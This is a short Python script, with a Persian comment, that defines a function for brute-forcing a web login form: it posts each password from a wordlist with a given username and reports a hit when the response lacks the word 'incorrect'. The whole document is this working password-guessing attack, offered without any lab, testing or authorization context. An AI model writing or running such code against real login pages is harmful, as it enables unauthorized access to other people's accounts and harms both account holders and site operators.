import requests

def crack_login_form(url, username_field, password_field, username, wordlist):
    for pwd in wordlist:
        data = {username_field: username, password_field: pwd}
        res = requests.post(url, data=data)
        if "incorrect" not in res.text.lower():  # بسته به سایت باید تنظیم شه
            print(f"[+] Found password: {pwd}")
            break
